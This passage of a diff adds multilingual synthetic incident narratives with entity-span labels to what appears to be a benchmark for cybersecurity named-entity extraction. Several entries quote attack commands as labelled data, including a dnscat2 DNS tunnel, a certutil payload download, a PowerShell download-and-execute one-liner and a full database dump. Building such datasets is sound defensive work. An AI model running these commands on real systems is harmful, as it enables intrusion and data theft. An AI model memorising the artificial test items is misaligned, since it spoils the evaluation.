+          "start": 527,
+          "end": 565,
+          "entity_type": "PORT_NUMBER",
+          "text": "nine thousand nine hundred ninety-nine"
+        },
+        {
+          "start": 570,
+          "end": 573,
+          "entity_type": "PROTOCOL",
+          "text": "TCP"
+        },
+        {
+          "start": 622,
+          "end": 686,
+          "entity_type": "HASH_FILE",
+          "text": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+        }
+      ]
+    },
+    {
+      "id": "cyber_026",
+      "description": "EN extremely long conversational narrative with DNS tunneling, many entities, adversarial",
+      "text": "You know what, I have been working in cybersecurity for fifteen years and I have never seen anything quite like this. The whole thing started when a junior analyst at CyberShield Corp, a kid named Tommy Nguyen, noticed some weird traffic patterns around half past midnight on the second of January. He thought it might be nothing, just some automated backup process or something, but he flagged it anyway. Turns out, the traffic was going from our internal DNS server DNS-CORE-01 to an external IP at 45.77.65.211 over port fifty-three, which would be normal except the payload was way too large for standard DNS queries. Tommy pulled the PCAP and found that someone, we now believe it was the threat actor known as Volt Typhoon, was using DNS tunneling technique T1071.004 to exfiltrate data. The command they used to set it up was something like dnscat2 --dns server=45.77.65.211 --secret s3cr3tK3y. The malware hash was 9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08 and the whole thing exploited CVE-2025-7777 in our DNS software. Tommy deserves a raise, honestly. You can reach him at t.nguyen@cybershield.com or +1-415-555-0199.",
+      "ground_truth": [
+        {
+          "start": 167,
+          "end": 183,
+          "entity_type": "ORGANIZATION",
+          "text": "CyberShield Corp"
+        },
+        {
+          "start": 197,
+          "end": 209,
+          "entity_type": "PERSON",
+          "text": "Tommy Nguyen"
+        },
+        {
+          "start": 254,
+          "end": 297,
+          "entity_type": "DATE_TIME",
+          "text": "half past midnight on the second of January"
+        },
+        {
+          "start": 468,
+          "end": 479,
+          "entity_type": "INTERNAL_SERVER",
+          "text": "DNS-CORE-01"
+        },
+        {
+          "start": 501,
+          "end": 513,
+          "entity_type": "IP_ADDRESS",
+          "text": "45.77.65.211"
+        },
+        {
+          "start": 524,
+          "end": 535,
+          "entity_type": "PORT_NUMBER",
+          "text": "fifty-three"
+        },
+        {
+          "start": 716,
+          "end": 728,
+          "entity_type": "THREAT_GROUP",
+          "text": "Volt Typhoon"
+        },
+        {
+          "start": 764,
+          "end": 773,
+          "entity_type": "MITRE_TECHNIQUE",
+          "text": "T1071.004"
+        },
+        {
+          "start": 848,
+          "end": 900,
+          "entity_type": "COMMAND",
+          "text": "dnscat2 --dns server=45.77.65.211 --secret s3cr3tK3y"
+        },
+        {
+          "start": 923,
+          "end": 987,
+          "entity_type": "HASH_FILE",
+          "text": "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08"
+        },
+        {
+          "start": 1018,
+          "end": 1031,
+          "entity_type": "CVE",
+          "text": "CVE-2025-7777"
+        },
+        {
+          "start": 1108,
+          "end": 1132,
+          "entity_type": "EMAIL_ADDRESS",
+          "text": "t.nguyen@cybershield.com"
+        },
+        {
+          "start": 1136,
+          "end": 1151,
+          "entity_type": "PHONE_NUMBER",
+          "text": "+1-415-555-0199"
+        }
+      ]
+    },
+    {
+      "id": "cyber_027",
+      "description": "FR rapport incident ransomware avec dates en lettres",
+      "text": "Le rapport d'incident numéro INC-2025-0187 a été rédigé par l'analyste Pierre Dubois le quatorze mars deux mille vingt-cinq. Un rançongiciel de type BlackCat a chiffré les données du serveur SRV-COMPTA-03 accessible depuis l'adresse 10.10.5.22. Le vecteur d'attaque initial était un courriel envoyé à p.dubois@entreprise.fr.",
+      "ground_truth": [
+        {
+          "start": 29,
+          "end": 42,
+          "entity_type": "INCIDENT_ID",
+          "text": "INC-2025-0187"
+        },
+        {
+          "start": 71,
+          "end": 84,
+          "entity_type": "PERSON",
+          "text": "Pierre Dubois"
+        },
+        {
+          "start": 85,
+          "end": 123,
+          "entity_type": "DATE_TIME",
+          "text": "le quatorze mars deux mille vingt-cinq"
+        },
+        {
+          "start": 149,
+          "end": 157,
+          "entity_type": "RANSOMWARE",
+          "text": "BlackCat"
+        },
+        {
+          "start": 191,
+          "end": 204,
+          "entity_type": "INTERNAL_SERVER",
+          "text": "SRV-COMPTA-03"
+        },
+        {
+          "start": 233,
+          "end": 243,
+          "entity_type": "IP_ADDRESS",
+          "text": "10.10.5.22"
+        },
+        {
+          "start": 301,
+          "end": 323,
+          "entity_type": "EMAIL_ADDRESS",
+          "text": "p.dubois@entreprise.fr"
+        }
+      ]
+    },
+    {
+      "id": "cyber_028",
+      "description": "FR campagne de phishing avec URL et CVE",
+      "text": "Notre équipe de réponse aux incidents a identifié une campagne d'hameçonnage ciblant les employés de Banque Aurore. L'analyste Sophie Martin a retracé les courriels jusqu'à l'adresse phishing@faux-banque.com. Le lien malveillant pointait vers https://secure.faux-banque.com/connexion et exploitait la vulnérabilité CVE-2025-4321. L'attaque a été détectée le vingt-trois février à seize heures trente.",
+      "ground_truth": [
+        {
+          "start": 101,
+          "end": 114,
+          "entity_type": "ORGANIZATION",
+          "text": "Banque Aurore"
+        },
+        {
+          "start": 127,
+          "end": 140,
+          "entity_type": "PERSON",
+          "text": "Sophie Martin"
+        },
+        {
+          "start": 183,
+          "end": 207,
+          "entity_type": "EMAIL_ADDRESS",
+          "text": "phishing@faux-banque.com"
+        },
+        {
+          "start": 243,
+          "end": 283,
+          "entity_type": "URL",
+          "text": "https://secure.faux-banque.com/connexion"
+        },
+        {
+          "start": 315,
+          "end": 328,
+          "entity_type": "CVE",
+          "text": "CVE-2025-4321"
+        },
+        {
+          "start": 355,
+          "end": 399,
+          "entity_type": "DATE_TIME",
+          "text": "le vingt-trois février à seize heures trente"
+        }
+      ]
+    },
+    {
+      "id": "cyber_029",
+      "description": "FR analyse malware avec hash, processus et port en lettres",
+      "text": "Je viens de terminer l'analyse du logiciel malveillant Qakbot découvert sur notre infrastructure. Le processus rundll32.exe a été utilisé pour charger la charge utile, qui communiquait avec le serveur de commande et contrôle à l'adresse https://c2.malware-network.ru/gate via le protocole HTTPS sur le port quatre cent quarante-trois. L'empreinte MD5 du fichier est d8e8fca2dc0f896fd7cb4cb0031ba249. L'incident a été signalé sous le numéro SOC-2025-0456 par Jean-Claude Renard le premier mars.",
+      "ground_truth": [
+        {
+          "start": 55,
+          "end": 61,
+          "entity_type": "MALWARE",
+          "text": "Qakbot"
+        },
+        {
+          "start": 111,
+          "end": 123,
+          "entity_type": "PROCESS_NAME",
+          "text": "rundll32.exe"
+        },
+        {
+          "start": 237,
+          "end": 271,
+          "entity_type": "URL",
+          "text": "https://c2.malware-network.ru/gate"
+        },
+        {
+          "start": 289,
+          "end": 294,
+          "entity_type": "PROTOCOL",
+          "text": "HTTPS"
+        },
+        {
+          "start": 307,
+          "end": 333,
+          "entity_type": "PORT_NUMBER",
+          "text": "quatre cent quarante-trois"
+        },
+        {
+          "start": 366,
+          "end": 398,
+          "entity_type": "HASH_FILE",
+          "text": "d8e8fca2dc0f896fd7cb4cb0031ba249"
+        },
+        {
+          "start": 440,
+          "end": 453,
+          "entity_type": "INCIDENT_ID",
+          "text": "SOC-2025-0456"
+        },
+        {
+          "start": 458,
+          "end": 476,
+          "entity_type": "PERSON",
+          "text": "Jean-Claude Renard"
+        },
+        {
+          "start": 477,
+          "end": 492,
+          "entity_type": "DATE_TIME",
+          "text": "le premier mars"
+        }
+      ]
+    },
+    {
+      "id": "cyber_030",
+      "description": "FR alerte MITRE APT29 avec multiples serveurs et port en lettres",
+      "text": "L'équipe de cyberdéfense de l'Agence Nationale de Cybersécurité a publié une alerte concernant le groupe de menaces APT29 qui cible activement les institutions européennes. La technique MITRE T1566.002 a été observée dans plusieurs attaques. Les serveurs compromis incluent PROXY-DMZ-FR01 et WEB-APP-FR03, tous deux contactant l'adresse 91.215.85.142 sur le port huit mille quatre-vingts. L'analyste responsable, Marie-Claire Lefèvre, peut être contactée au +33-1-42-86-7200 ou à mc.lefevre@cyber-agence.gouv.fr.",
+      "ground_truth": [
+        {
+          "start": 30,
+          "end": 63,
+          "entity_type": "ORGANIZATION",
+          "text": "Agence Nationale de Cybersécurité"
+        },
+        {
+          "start": 116,
+          "end": 121,
+          "entity_type": "THREAT_GROUP",
+          "text": "APT29"
+        },
+        {
+          "start": 192,
+          "end": 201,
+          "entity_type": "MITRE_TECHNIQUE",
+          "text": "T1566.002"
+        },
+        {
+          "start": 274,
+          "end": 288,
+          "entity_type": "INTERNAL_SERVER",
+          "text": "PROXY-DMZ-FR01"
+        },
+        {
+          "start": 292,
+          "end": 304,
+          "entity_type": "INTERNAL_SERVER",
+          "text": "WEB-APP-FR03"
+        },
+        {
+          "start": 337,
+          "end": 350,
+          "entity_type": "IP_ADDRESS",
+          "text": "91.215.85.142"
+        },
+        {
+          "start": 363,
+          "end": 387,
+          "entity_type": "PORT_NUMBER",
+          "text": "huit mille quatre-vingts"
+        },
+        {
+          "start": 413,
+          "end": 433,
+          "entity_type": "PERSON",
+          "text": "Marie-Claire Lefèvre"
+        },
+        {
+          "start": 458,
+          "end": 474,
+          "entity_type": "PHONE_NUMBER",
+          "text": "+33-1-42-86-7200"
+        },
+        {
+          "start": 480,
+          "end": 511,
+          "entity_type": "EMAIL_ADDRESS",
+          "text": "mc.lefevre@cyber-agence.gouv.fr"
+        }
+      ]
+    },
+    {
+      "id": "cyber_031",
+      "description": "FR narratif complexe avec mot de passe, CWE, commande et processus",
+      "text": "Franchement, je n'ai jamais vu un cas aussi compliqué en quinze ans de carrière. Tout a commencé le sept mars vers vingt-deux heures quarante-cinq quand notre système de détection d'intrusion a repéré des connexions suspectes depuis le serveur de fichiers FS-SIEGE-PARIS vers une adresse externe 185.156.73.54. L'utilisateur compromis était le compte admin_backup avec le mot de passe Soleil2025!Mars que l'attaquant, probablement lié au collectif Turla, avait obtenu grâce à la faille CWE-522. Le maliciel déployé, une variante de Snake, utilisait le processus svchost.exe pour se camoufler et exécutait la commande certutil -urlcache -f https://dl.malware.ru/payload pour télécharger des composants additionnels.",
+      "ground_truth": [
+        {
+          "start": 97,
+          "end": 146,
+          "entity_type": "DATE_TIME",
+          "text": "le sept mars vers vingt-deux heures quarante-cinq"
+        },
+        {
+          "start": 256,
+          "end": 270,
+          "entity_type": "INTERNAL_SERVER",
+          "text": "FS-SIEGE-PARIS"
+        },
+        {
+          "start": 296,
+          "end": 309,
+          "entity_type": "IP_ADDRESS",
+          "text": "185.156.73.54"
+        },
+        {
+          "start": 351,
+          "end": 363,
+          "entity_type": "USERNAME",
+          "text": "admin_backup"
+        },
+        {
+          "start": 385,
+          "end": 400,
+          "entity_type": "PASSWORD",
+          "text": "Soleil2025!Mars"
+        },
+        {
+          "start": 448,
+          "end": 453,
+          "entity_type": "THREAT_GROUP",
+          "text": "Turla"
+        },
+        {
+          "start": 486,
+          "end": 493,
+          "entity_type": "CWE",
+          "text": "CWE-522"
+        },
+        {
+          "start": 532,
+          "end": 537,
+          "entity_type": "MALWARE",
+          "text": "Snake"
+        },
+        {
+          "start": 562,
+          "end": 573,
+          "entity_type": "PROCESS_NAME",
+          "text": "svchost.exe"
+        },
+        {
+          "start": 617,
+          "end": 668,
+          "entity_type": "COMMAND",
+          "text": "certutil -urlcache -f https://dl.malware.ru/payload"
+        }
+      ]
+    },
+    {
+      "id": "cyber_032",
+      "description": "FR bulletin sécurité avec multiples CVE, IPs, ports en lettres et IBAN",
+      "text": "Le bulletin de sécurité TLP:AMBER référence CERT-2025-0078 détaille une nouvelle campagne du groupe Lazarus Group ciblant le secteur bancaire. Les attaquants exploitent CVE-2025-1234 et CVE-2024-9876 pour compromettre les serveurs Exchange. La Banque Méridionale a identifié des communications entre le serveur MAIL-EXCH-EU01 et les adresses 103.224.182.50 et 45.141.84.67 sur les ports vingt-cinq et cinq cent quatre-vingt-sept via SMTP. Le hash du dropper est 4a8a08f09d37b73795649038408b5f33 et l'analyste François Beaumont est joignable au +33-6-12-34-56-78.",
+      "ground_truth": [
+        {
+          "start": 44,
+          "end": 58,
+          "entity_type": "INCIDENT_ID",
+          "text": "CERT-2025-0078"
+        },
+        {
+          "start": 100,
+          "end": 113,
+          "entity_type": "THREAT_GROUP",
+          "text": "Lazarus Group"
+        },
+        {
+          "start": 169,
+          "end": 182,
+          "entity_type": "CVE",
+          "text": "CVE-2025-1234"
+        },
+        {
+          "start": 186,
+          "end": 199,
+          "entity_type": "CVE",
+          "text": "CVE-2024-9876"
+        },
+        {
+          "start": 244,
+          "end": 262,
+          "entity_type": "ORGANIZATION",
+          "text": "Banque Méridionale"
+        },
+        {
+          "start": 311,
+          "end": 325,
+          "entity_type": "INTERNAL_SERVER",
+          "text": "MAIL-EXCH-EU01"
+        },
+        {
+          "start": 342,
+          "end": 356,
+          "entity_type": "IP_ADDRESS",
+          "text": "103.224.182.50"
+        },
+        {
+          "start": 360,
+          "end": 372,
+          "entity_type": "IP_ADDRESS",
+          "text": "45.141.84.67"
+        },
+        {
+          "start": 387,
+          "end": 397,
+          "entity_type": "PORT_NUMBER",
+          "text": "vingt-cinq"
+        },
+        {
+          "start": 401,
+          "end": 428,
+          "entity_type": "PORT_NUMBER",
+          "text": "cinq cent quatre-vingt-sept"
+        },
+        {
+          "start": 433,
+          "end": 437,
+          "entity_type": "PROTOCOL",
+          "text": "SMTP"
+        },
+        {
+          "start": 462,
+          "end": 494,
+          "entity_type": "HASH_FILE",
+          "text": "4a8a08f09d37b73795649038408b5f33"
+        },
+        {
+          "start": 509,
+          "end": 526,
+          "entity_type": "PERSON",
+          "text": "François Beaumont"
+        },
+        {
+          "start": 544,
+          "end": 561,
+          "entity_type": "PHONE_NUMBER",
+          "text": "+33-6-12-34-56-78"
+        }
+      ]
+    },
+    {
+      "id": "cyber_033",
+      "description": "FR adversarial - port de Marseille vs port réseau, personne nommée Port",
+      "text": "Le port de Marseille n'a rien à voir avec le port réseau quatre-vingt-dix utilisé dans cette attaque. L'analyste Philippe Port a identifié que le serveur WEB-MARSEILLE-01 avait été ciblé par le malware RedLine le quatorze mars. Le trafic malveillant transitait par l'adresse 77.88.55.66 et l'IBAN du compte utilisé pour le paiement de la rançon était FR7630006000011234567890189.",
+      "ground_truth": [
+        {
+          "start": 57,
+          "end": 73,
+          "entity_type": "PORT_NUMBER",
+          "text": "quatre-vingt-dix"
+        },
+        {
+          "start": 113,
+          "end": 126,
+          "entity_type": "PERSON",
+          "text": "Philippe Port"
+        },
+        {
+          "start": 154,
+          "end": 170,
+          "entity_type": "INTERNAL_SERVER",
+          "text": "WEB-MARSEILLE-01"
+        },
+        {
+          "start": 202,
+          "end": 209,
+          "entity_type": "MALWARE",
+          "text": "RedLine"
+        },
+        {
+          "start": 210,
+          "end": 226,
+          "entity_type": "DATE_TIME",
+          "text": "le quatorze mars"
+        },
+        {
+          "start": 275,
+          "end": 286,
+          "entity_type": "IP_ADDRESS",
+          "text": "77.88.55.66"
+        },
+        {
+          "start": 351,
+          "end": 378,
+          "entity_type": "IBAN_CODE",
+          "text": "FR7630006000011234567890189"
+        }
+      ]
+    },
+    {
+      "id": "cyber_034",
+      "description": "FR très long narratif avec multiples entités, mot de passe, MITRE",
+      "text": "Pour résumer cette affaire particulièrement complexe, il faut remonter au vingt-sept janvier deux mille vingt-cinq. Ce jour-là, l'administrateur système Nicolas Petit-Jean a remarqué que le processus lsass.exe consommait anormalement de la mémoire sur le contrôleur de domaine AD-DC-FR01. En creusant davantage, il a découvert qu'un attaquant avait utilisé la technique T1003.001 pour extraire les identifiants du domaine. Le compte compromis était celui de l'utilisateur n.petitjean avec le mot de passe Hiver2025!Froid. L'investigation a révélé que le groupe de menaces Wizard Spider avait exploité la vulnérabilité CVE-2025-5555 pour s'introduire initialement dans le réseau via le serveur VPN-GW-LYON, avant de pivoter vers le contrôleur de domaine. Les données exfiltrées ont été envoyées à https://exfil.darknet.xyz/upload depuis l'adresse 185.220.101.88 sur le port huit mille quatre cent quarante-trois.",
+      "ground_truth": [
+        {
+          "start": 74,
+          "end": 114,
+          "entity_type": "DATE_TIME",
+          "text": "vingt-sept janvier deux mille vingt-cinq"
+        },
+        {
+          "start": 153,
+          "end": 171,
+          "entity_type": "PERSON",
+          "text": "Nicolas Petit-Jean"
+        },
+        {
+          "start": 200,
+          "end": 209,
+          "entity_type": "PROCESS_NAME",
+          "text": "lsass.exe"
+        },
+        {
+          "start": 277,
+          "end": 287,
+          "entity_type": "INTERNAL_SERVER",
+          "text": "AD-DC-FR01"
+        },
+        {
+          "start": 370,
+          "end": 379,
+          "entity_type": "MITRE_TECHNIQUE",
+          "text": "T1003.001"
+        },
+        {
+          "start": 472,
+          "end": 483,
+          "entity_type": "USERNAME",
+          "text": "n.petitjean"
+        },
+        {
+          "start": 505,
+          "end": 520,
+          "entity_type": "PASSWORD",
+          "text": "Hiver2025!Froid"
+        },
+        {
+          "start": 572,
+          "end": 585,
+          "entity_type": "THREAT_GROUP",
+          "text": "Wizard Spider"
+        },
+        {
+          "start": 618,
+          "end": 631,
+          "entity_type": "CVE",
+          "text": "CVE-2025-5555"
+        },
+        {
+          "start": 693,
+          "end": 704,
+          "entity_type": "INTERNAL_SERVER",
+          "text": "VPN-GW-LYON"
+        },
+        {
+          "start": 796,
+          "end": 828,
+          "entity_type": "URL",
+          "text": "https://exfil.darknet.xyz/upload"
+        },
+        {
+          "start": 846,
+          "end": 860,
+          "entity_type": "IP_ADDRESS",
+          "text": "185.220.101.88"
+        },
+        {
+          "start": 873,
+          "end": 910,
+          "entity_type": "PORT_NUMBER",
+          "text": "huit mille quatre cent quarante-trois"
+        }
+      ]
+    },
+    {
+      "id": "cyber_035",
+      "description": "FR extrêmement long avec commande PowerShell, faux positifs, DNS",
+      "text": "Écoutez, je sais que ça va sembler incroyable, mais le serveur de production PROD-ORACLE-DB01 a été compromis pendant exactement trois cent soixante-cinq jours sans que personne ne s'en aperçoive. C'est l'analyste externe Amélie Deschamps-Fontaine de la société CyberGuard Europe qui a fini par détecter l'intrusion le dix-huit mars lors d'un audit de routine. L'acteur de la menace, identifié comme Charming Kitten, avait implanté le maliciel CharmPower qui communiquait via DNS sur le port cinquante-trois avec le serveur 198.51.100.33. Le processus malveillant java_update.exe lançait régulièrement la commande powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('https://mal.charming.ir/ps') pour mettre à jour ses composants. Les hashes récupérés incluent 8743b52063cd84097a65d1633f5c74f5 en MD5. Pour signaler tout élément suspect, contactez a.deschamps@cyberguard.eu ou le +33-1-55-66-77-88.",
+      "ground_truth": [
+        {
+          "start": 77,
+          "end": 93,
+          "entity_type": "INTERNAL_SERVER",
+          "text": "PROD-ORACLE-DB01"
+        },
+        {
+          "start": 222,
+          "end": 247,
+          "entity_type": "PERSON",
+          "text": "Amélie Deschamps-Fontaine"
+        },
+        {
+          "start": 262,
+          "end": 279,
+          "entity_type": "ORGANIZATION",
+          "text": "CyberGuard Europe"
+        },
+        {
+          "start": 316,
+          "end": 332,
+          "entity_type": "DATE_TIME",
+          "text": "le dix-huit mars"
+        },
+        {
+          "start": 400,
+          "end": 415,
+          "entity_type": "THREAT_GROUP",
+          "text": "Charming Kitten"
+        },
+        {
+          "start": 444,
+          "end": 454,
+          "entity_type": "MALWARE",
+          "text": "CharmPower"
+        },
+        {
+          "start": 476,
+          "end": 479,
+          "entity_type": "PROTOCOL",
+          "text": "DNS"
+        },
+        {
+          "start": 492,
+          "end": 507,
+          "entity_type": "PORT_NUMBER",
+          "text": "cinquante-trois"
+        },
+        {
+          "start": 524,
+          "end": 537,
+          "entity_type": "IP_ADDRESS",
+          "text": "198.51.100.33"
+        },
+        {
+          "start": 564,
+          "end": 579,
+          "entity_type": "PROCESS_NAME",
+          "text": "java_update.exe"
+        },
+        {
+          "start": 614,
+          "end": 713,
+          "entity_type": "COMMAND",
+          "text": "powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('https://mal.charming.ir/ps')"
+        },
+        {
+          "start": 779,
+          "end": 811,
+          "entity_type": "HASH_FILE",
+          "text": "8743b52063cd84097a65d1633f5c74f5"
+        },
+        {
+          "start": 866,
+          "end": 891,
+          "entity_type": "EMAIL_ADDRESS",
+          "text": "a.deschamps@cyberguard.eu"
+        },
+        {
+          "start": 898,
+          "end": 915,
+          "entity_type": "PHONE_NUMBER",
+          "text": "+33-1-55-66-77-88"
+        }
+      ]
+    },
+    {
+      "id": "cyber_036",
+      "description": "FR adversarial - personne nommée Serveur, hôpital, mot de passe en clair",
+      "text": "Le service informatique de l'Hôpital Saint-Michel a signalé une anomalie le huit mars deux mille vingt-cinq. Le docteur Antoine Serveur, malgré son nom de famille prêtant à confusion, n'a aucun lien avec le serveur SANTE-APP-02 qui a été compromis. L'attaque exploitait CWE-287 pour contourner l'authentification et le malware Dridex a été détecté communiquant avec 172.67.182.33 sur le port quatre mille quatre cents via HTTPS. Le mot de passe administrateur Bienvenue123! a été trouvé en clair dans les journaux.",
+      "ground_truth": [
+        {
+          "start": 29,
+          "end": 49,
+          "entity_type": "ORGANIZATION",
+          "text": "Hôpital Saint-Michel"
+        },
+        {
+          "start": 73,
+          "end": 107,
+          "entity_type": "DATE_TIME",
+          "text": "le huit mars deux mille vingt-cinq"
+        },
+        {
+          "start": 120,
+          "end": 135,
+          "entity_type": "PERSON",
+          "text": "Antoine Serveur"
+        },
+        {
+          "start": 215,
+          "end": 227,
+          "entity_type": "INTERNAL_SERVER",
+          "text": "SANTE-APP-02"
+        },
+        {
+          "start": 270,
+          "end": 277,
+          "entity_type": "CWE",
+          "text": "CWE-287"
+        },
+        {
+          "start": 327,
+          "end": 333,
+          "entity_type": "MALWARE",
+          "text": "Dridex"
+        },
+        {
+          "start": 366,
+          "end": 379,
+          "entity_type": "IP_ADDRESS",
+          "text": "172.67.182.33"
+        },
+        {
+          "start": 392,
+          "end": 417,
+          "entity_type": "PORT_NUMBER",
+          "text": "quatre mille quatre cents"
+        },
+        {
+          "start": 422,
+          "end": 427,
+          "entity_type": "PROTOCOL",
+          "text": "HTTPS"
+        },
+        {
+          "start": 460,
+          "end": 473,
+          "entity_type": "PASSWORD",
+          "text": "Bienvenue123!"
+        }
+      ]
+    },
+    {
+      "id": "cyber_037",
+      "description": "ES informe básico con puerto y fecha en letras",
+      "text": "El equipo de seguridad de InfoTech Madrid ha detectado un incidente el doce de marzo de dos mil veinticinco. El analista Carlos Rodríguez García identificó que el servidor CORREO-SRV-ES01 fue comprometido mediante la vulnerabilidad CVE-2025-6789. El atacante accedió desde la dirección IP 91.121.45.67 utilizando el protocolo SSH en el puerto veintidós.",
+      "ground_truth": [
+        {
+          "start": 26,
+          "end": 41,
+          "entity_type": "ORGANIZATION",
+          "text": "InfoTech Madrid"
+        },
+        {
+          "start": 68,
+          "end": 107,
+          "entity_type": "DATE_TIME",
+          "text": "el doce de marzo de dos mil veinticinco"
+        },
+        {
+          "start": 121,
+          "end": 144,
+          "entity_type": "PERSON",
+          "text": "Carlos Rodríguez García"
+        },
+        {
+          "start": 172,
+          "end": 187,
+          "entity_type": "INTERNAL_SERVER",
+          "text": "CORREO-SRV-ES01"
+        },
+        {
+          "start": 232,
+          "end": 245,
+          "entity_type": "CVE",
+          "text": "CVE-2025-6789"
+        },
+        {
+          "start": 289,
+          "end": 301,
+          "entity_type": "IP_ADDRESS",
+          "text": "91.121.45.67"
+        },
+        {
+          "start": 326,
+          "end": 329,
+          "entity_type": "PROTOCOL",
+          "text": "SSH"
+        },
+        {
+          "start": 343,
+          "end": 352,
+          "entity_type": "PORT_NUMBER",
+          "text": "veintidós"
+        }
+      ]
+    },
+    {
+      "id": "cyber_038",
+      "description": "ES análisis malware con hash SHA256, proceso y fecha en letras",
+      "text": "El informe de análisis de malware número SOC-2025-0333 describe el comportamiento del troyano Emotet detectado en nuestra red corporativa. El proceso svchost32.exe fue creado para establecer comunicación con el servidor de comando y control en https://botnet.evil-domain.com/gate. La huella SHA256 del archivo malicioso es abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890. La analista Lucía Fernández Martín reportó el hallazgo el veintiuno de febrero a las catorce horas y cuarenta y cinco minutos.",
+      "ground_truth": [
+        {
+          "start": 41,
+          "end": 54,
+          "entity_type": "INCIDENT_ID",
+          "text": "SOC-2025-0333"
+        },
+        {
+          "start": 94,
+          "end": 100,
+          "entity_type": "MALWARE",
+          "text": "Emotet"
+        },
+        {
+          "start": 150,
+          "end": 163,
+          "entity_type": "PROCESS_NAME",
+          "text": "svchost32.exe"
+        },
+        {
+          "start": 244,
+          "end": 279,
+          "entity_type": "URL",
+          "text": "https://botnet.evil-domain.com/gate"
+        },
+        {
+          "start": 323,
+          "end": 387,
+          "entity_type": "HASH_FILE",
+          "text": "abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890"
+        },
+        {
+          "start": 401,
+          "end": 423,
+          "entity_type": "PERSON",
+          "text": "Lucía Fernández Martín"
+        },
+        {
+          "start": 444,
+          "end": 514,
+          "entity_type": "DATE_TIME",
+          "text": "el veintiuno de febrero a las catorce horas y cuarenta y cinco minutos"
+        }
+      ]
+    },
+    {
+      "id": "cyber_039",
+      "description": "ES campaña phishing con múltiples emails y teléfono",
+      "text": "La campaña de phishing detectada por el Centro Nacional de Ciberseguridad afectó a más de doscientos empleados de Grupo Santander Digital. Los correos electrónicos provenían de la dirección soporte@santander-seguro.xyz y redirigían a https://santander-seguro.xyz/login para robar credenciales. El grupo de amenazas Scattered Spider fue identificado como responsable. El ataque fue notificado el quince de marzo por la investigadora Ana Belén Torres al correo electrónico cert@ciberseguridad.gob.es y al teléfono +34-91-123-4567.",
+      "ground_truth": [
+        {
+          "start": 40,
+          "end": 73,
+          "entity_type": "ORGANIZATION",
+          "text": "Centro Nacional de Ciberseguridad"
+        },
+        {
+          "start": 114,
+          "end": 137,
+          "entity_type": "ORGANIZATION",
+          "text": "Grupo Santander Digital"
+        },
+        {
+          "start": 190,
+          "end": 218,
+          "entity_type": "EMAIL_ADDRESS",
+          "text": "soporte@santander-seguro.xyz"
+        },
+        {
+          "start": 234,
+          "end": 268,
+          "entity_type": "URL",
+          "text": "https://santander-seguro.xyz/login"
+        },
+        {
+          "start": 315,
+          "end": 331,
+          "entity_type": "THREAT_GROUP",
+          "text": "Scattered Spider"
+        },
+        {
+          "start": 392,
+          "end": 410,
+          "entity_type": "DATE_TIME",
+          "text": "el quince de marzo"
+        },
+        {
+          "start": 432,
+          "end": 448,
+          "entity_type": "PERSON",
+          "text": "Ana Belén Torres"
+        },
+        {
+          "start": 471,
+          "end": 497,
+          "entity_type": "EMAIL_ADDRESS",
+          "text": "cert@ciberseguridad.gob.es"
+        },
+        {
+          "start": 512,
+          "end": 527,
+          "entity_type": "PHONE_NUMBER",
+          "text": "+34-91-123-4567"
+        }
+      ]
+    },
+    {
+      "id": "cyber_040",
+      "description": "ES narrativa compleja con ransomware, contraseña, MITRE y puerto en letras",
+      "text": "Debo admitir que esta investigación ha sido una de las más complicadas que me ha tocado. Todo comenzó cuando el usuario admin_legacy intentó conectarse al servidor de bases de datos BD-PRODUCCION-03 desde la dirección 178.62.210.44 un martes por la noche, concretamente el cuatro de marzo de dos mil veinticinco alrededor de las veintitrés horas. El atacante utilizó la contraseña Primavera2025! que había obtenido mediante la técnica T1110.001 de fuerza bruta. Una vez dentro, ejecutó la instrucción mysqldump --all-databases > /tmp/dump.sql para extraer toda la información. El ransomware LockBit 3.0 fue desplegado posteriormente, cifrando los archivos con la extensión .lb3. La comunicación con el servidor de control se realizaba a través de 203.0.113.88 por el puerto ocho mil ochocientos ochenta y ocho.",
+      "ground_truth": [
+        {
+          "start": 120,
+          "end": 132,
+          "entity_type": "USERNAME",
+          "text": "admin_legacy"
+        },
+        {
+          "start": 182,
+          "end": 198,
+          "entity_type": "INTERNAL_SERVER",
+          "text": "BD-PRODUCCION-03"
+        },
+        {
+          "start": 218,
+          "end": 231,
+          "entity_type": "IP_ADDRESS",
+          "text": "178.62.210.44"
+        },
+        {
+          "start": 270,
+          "end": 345,
+          "entity_type": "DATE_TIME",
+          "text": "el cuatro de marzo de dos mil veinticinco alrededor de las veintitrés horas"
+        },
+        {
+          "start": 381,
+          "end": 395,
+          "entity_type": "PASSWORD",
+          "text": "Primavera2025!"
+        },
+        {
+          "start": 435,
+          "end": 444,
+          "entity_type": "MITRE_TECHNIQUE",
+          "text": "T1110.001"
+        },
+        {
+          "start": 501,
+          "end": 542,
+          "entity_type": "COMMAND",
+          "text": "mysqldump --all-databases > /tmp/dump.sql"
+        },
+        {
+          "start": 591,
+          "end": 602,
+          "entity_type": "RANSOMWARE",
+          "text": "LockBit 3.0"
+        },
+        {
+          "start": 747,
+          "end": 759,
+          "entity_type": "IP_ADDRESS",
+          "text": "203.0.113.88"
+        },
+        {
+          "start": 774,
+          "end": 809,
+          "entity_type": "PORT_NUMBER",
+          "text": "ocho mil ochocientos ochenta y ocho"
+        }
+      ]
+    },
+    {
+      "id": "cyber_041",
+      "description": "ES adversarial - persona apellido Puerto, CWE, CVE, hash",
+      "text": "La vulnerabilidad descubierta por el pentester Miguel Ángel Puerto no tiene relación con el puerto de red cuatrocientos cuarenta y tres que fue explotado. Es importante no confundir al investigador con la infraestructura comprometida. El servidor WEB-DMZ-BCN01 de la empresa TelcoNet España presentaba las debilidades CWE-79 y CWE-352 en su aplicación web. El atacante, vinculado al grupo FIN7, utilizó el exploit correspondiente a CVE-2025-8888 para inyectar el malware Carbanak. El hash del ejecutable malicioso es 098f6bcd4621d373cade4e832627b4f6 y fue detectado el diecisiete de marzo.",
+      "ground_truth": [
+        {
+          "start": 47,
+          "end": 66,
+          "entity_type": "PERSON",
+          "text": "Miguel Ángel Puerto"
+        },
+        {
+          "start": 106,
+          "end": 135,
